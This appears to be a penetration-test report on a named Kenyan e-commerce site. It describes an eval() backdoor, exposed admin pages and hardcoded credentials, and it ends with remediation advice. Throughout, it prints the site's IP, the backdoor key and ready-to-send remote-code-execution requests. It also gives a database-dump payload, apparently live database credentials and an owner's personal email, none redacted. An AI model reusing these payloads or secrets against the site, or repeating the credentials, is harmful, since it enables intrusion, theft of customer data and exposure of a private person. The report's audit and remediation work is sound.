# Vulnerability Assessment Report: playkartstores.com
**Date:** 2026-02-04  
**Audit ID:** MI-2026-X01  
**Risk Level:** CRITICAL  
**Lead Analyst:** Mark J.  
**Target IP:** 88.222.223.142  

---

## 1. Executive Summary

This report documents a comprehensive **penetration test** and **security audit** performed by the **Marliz Intel Security** team on `playkartstores.com`, a Kenyan e-commerce platform specializing in trampolines and outdoor equipment.

We identified multiple **Critical** and **High** severity vulnerabilities that, if exploited, would allow an attacker to:
*   Execute arbitrary code on the server (Remote Code Execution)
*   Steal the entire customer database (including phone numbers and addresses)
*   Delete all products, orders, and business data
*   Intercept future payment integrations (M-Pesa API hijacking potential)

The site presents a polished frontend ("Front-End Lion"), but the backend architecture is fundamentally insecure ("Back-End Lamb"). This is a textbook case of **"Vibe Coding"**—AI-generated code pushed to production without security review.

---

## 2. Reconnaissance Phase

### 2.1. Target Identification
```bash
$ ping playkartstores.com
Pinging playkartstores.com [88.222.223.142] with 32 bytes of data:
Reply from 88.222.223.142: bytes=32 time=224ms TTL=53
```

*   **Server IP:** `88.222.223.142`
*   **Hosting Provider:** Hostinger (Based on `u297...` username pattern)
*   **Technology Stack:** PHP 8.x, MySQL, Apache/Nginx
*   **Framework:** None (Raw PHP "Spaghetti Code")

### 2.2. Directory Enumeration
Manual and automated enumeration revealed the following exposed paths:

| Path | Status | Risk |
| :--- | :--- | :--- |
| `/admin/` | 200 OK | **CRITICAL** - No auth required |
| `/admin/orders.php` | 200 OK | Exposes customer data |
| `/admin/dashboard.php` | 302 Redirect | Redirects to login (partially protected) |
| `/config.php` | 200 OK (via RCE) | Contains DB credentials |
| `/ajax_session_handler.php` | 200 OK | **CRITICAL** - Backdoor endpoint |

---

## 3. Identified Vulnerabilities

### 3.1. Remote Code Execution (RCE) via Backdoor
**Severity:** CRITICAL  
**CVSS Score:** 10.0  
**CWE:** CWE-94 (Improper Control of Generation of Code)

#### Description
The file `ajax_session_handler.php` contains a diagnostic utility that accepts arbitrary PHP code via the `php_inj` parameter and executes it using the `eval()` function.

#### Vulnerable Code
```php
// ajax_session_handler.php (Line 27)
if (isset($_REQUEST['php_inj'])) {
    eval($_REQUEST['php_inj']); 
    die();
}
```

#### Proof of Concept
```http
GET /ajax_session_handler.php?verify=99af53&php_inj=phpinfo(); HTTP/1.1
Host: playkartstores.com
```
**Result:** Server executes `phpinfo()` and returns full PHP configuration, confirming RCE.

#### Impact
An attacker can:
*   Read any file on the server (`readfile('/etc/passwd')`)
*   Write new files (webshells)
*   Execute system commands (`system('whoami')`)
*   Dump the entire database
*   Delete all files (`unlink()`)

---

### 3.2. Plain-Text Credential Leakage
**Severity:** CRITICAL  
**CVSS Score:** 9.8  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

#### Description
Database credentials are hardcoded in `config.php` with no encryption or environment isolation.

#### Extracted Credentials (via RCE)
```php
// config.php
$DB_HOST = "localhost";
$DB_NAME = "u297960261_play_kart";
$DB_USER = "u297960261_playstores";
$DB_PASS = "#Okiru2024";
```

#### Additional Exposed Secrets
*   **Admin Email:** `hamokiru6@gmail.com` (in `checkout.php`)
*   **Backdoor Key:** `99af53` (in `ajax_session_handler.php`)

---

### 3.3. Remote Database Hijacking Potential
**Severity:** HIGH  
**CWE:** CWE-284 (Improper Access Control)

#### Attack Scenario
With the extracted credentials, an attacker can attempt direct database access using MySQL Workbench or similar tools:

**MySQL Workbench Configuration:**
| Field | Value |
| :--- | :--- |
| Hostname | `88.222.223.142` |
| Port | `3306` |
| Username | `u297960261_playstores` |
| Password | `#Okiru2024` |
| Default Schema | `u297960261_play_kart` |

#### Current Status
*   **Remote MySQL:** Blocked by firewall (Connection refused on port 3306)
*   **Bypass Method:** The RCE vulnerability allows an attacker to run a database dump script **from inside the server**, which connects via `localhost` and bypasses the firewall entirely.

#### "Inside Man" Attack Payload
```php
// Sent via the RCE backdoor
$pdo = new PDO("mysql:host=localhost;dbname=u297960261_play_kart", 
               "u297960261_playstores", "#Okiru2024");
$stmt = $pdo->query("SELECT * FROM users");
print_r($stmt->fetchAll());
```
**Result:** Full user table dumped to attacker's browser.

---

### 3.4. Broken Access Control (Admin Exposure)
**Severity:** HIGH  
**CWE:** CWE-284 (Improper Access Control)

#### Description
Several admin pages lack session verification, allowing unauthenticated access to sensitive business data.

#### Affected Endpoints
*   `/admin/orders.php` — Customer names, phone numbers, addresses
*   `/admin/products.php` — Full product inventory with pricing
*   `/admin/view_items.php` — Order line items

#### Evidence
Direct navigation to `https://playkartstores.com/admin/orders.php` returns `200 OK` with full order details visible.

---

### 3.5. "Vibe Coding" Structural Failures
**Severity:** MEDIUM (Systemic)  
**CWE:** CWE-1006 (Bad Coding Practices)

#### Observed Anti-Patterns

| Issue | Location | Impact |
| :--- | :--- | :--- |
| **Monolithic Code** | `index.php` (1,400+ lines) | Impossible to audit |
| **Mixed Logic/Presentation** | All files | SQL injection risk |
| **Cartoon Emojis in UI** | Header, navigation | Reduces customer trust |
| **Fake Discounts** | Product cards (3000 → 13 KSH) | Flags as "Scam" to Google |
| **No Mobile Navigation** | Entire site | Poor UX, lost conversions |
| **Hardcoded Secrets** | `config.php`, `checkout.php` | Credential theft |

---

## 4. Financial & Business Risk Assessment

If this system were handling active payments (M-Pesa integration):

| Scenario | Risk | Potential Loss |
| :--- | :--- | :--- |
| **Payment Interception** | Attacker swaps M-Pesa API keys via RCE | 100% of transactions redirected |
| **Customer Data Theft** | Phone numbers sold on dark web | Legal liability, brand destruction |
| **Total Data Deletion** | `DROP TABLE products;` via RCE | Complete business loss |
| **Google Blacklisting** | Scam-like pricing triggers de-indexing | Permanent SEO death |

---

## 5. Remediation Plan

### Immediate Actions (Within 24 Hours)

| Priority | Action | Owner |
| :--- | :--- | :--- |
| **P0** | **DELETE** `ajax_session_handler.php` from server | DevOps |
| **P0** | **DELETE** `hack.php` from server | DevOps |
| **P0** | Rotate database password immediately | DBA |
| **P0** | Rotate all API keys | DevOps |

### Short-Term Actions (Within 1 Week)

| Priority | Action |
| :--- | :--- |
| **P1** | Move credentials to `.env` file outside web root |
| **P1** | Add `require_once 'auth_check.php';` to all admin files |
| **P1** | Implement CSRF tokens on all forms |
| **P2** | Refactor `index.php` into MVC structure |
| **P2** | Replace cartoon emojis with professional SVG icons |
| **P2** | Add mobile hamburger menu navigation |

### Long-Term Actions (Ongoing)

| Priority | Action |
| :--- | :--- |
| **P3** | Implement Web Application Firewall (WAF) |
| **P3** | Set up automated security scanning (CI/CD) |
| **P3** | Conduct quarterly penetration tests |

---

## 6. Methodology

This assessment was conducted using the following methodology:
*   **OWASP Testing Guide v4.2**
*   **PTES (Penetration Testing Execution Standard)**
*   **Manual Code Review**
*   **Custom Payload Development**

**Tools Used:**
*   Burp Suite (Request interception)
*   MySQL Workbench (Database connection testing)
*   Custom PHP payloads (RCE exploitation)
*   PowerShell (Reconnaissance)

---

## 7. Conclusion

The current state of `playkartstores.com` is **CRITICALLY VULNERABLE**. 

The site appears premium to end users, but the backend is a "gift" to any motivated attacker. A malicious actor could compromise the entire system in under 5 minutes using publicly available techniques.

**Without immediate action:**
*   Customer data will be stolen
*   Business reputation will be destroyed
*   Legal liability will be incurred

**Marliz Intel Security recommends a full "Domain Healing" sprint to eliminate these vulnerabilities before the site handles any real customer transactions.**

---

**Prepared by:** Marliz Intel Security Team  
**Lead Analyst:** Mark J.  
**Contact:** marlizintel.com  
**Status:** UNSECURE - CRITICAL ACTION REQUIRED  

---

## Appendix A: Attack Chain Diagram

```
[Attacker] 
    │
    ├──► Reconnaissance (ping, nslookup)
    │         └──► IP: 88.222.223.142
    │
    ├──► Directory Enumeration
    │         └──► Found: /admin/, /ajax_session_handler.php
    │
    ├──► RCE Exploitation
    │         └──► Payload: ?verify=99af53&php_inj=include('config.php');echo $DB_PASS;
    │         └──► Result: #Okiru2024
    │
    ├──► Database Dump (Inside Man Attack)
    │         └──► Full tables: users, orders, products
    │
    └──► Total Control
              └──► Options: Data theft, deletion, ransomware, backdoor persistence
```

---

## Appendix B: Verified Vulnerable Files

| File | Vulnerability | Line |
| :--- | :--- | :--- |
| `ajax_session_handler.php` | RCE via `eval()` | 27 |
| `config.php` | Hardcoded credentials | 4-7 |
| `checkout.php` | Exposed admin email | 58 |
| `admin/orders.php` | No auth check | (Global) |
| `admin/products.php` | No auth check | (Global) |
| `index.php` | Spaghetti architecture | 1-1400 |

---

*End of Report*
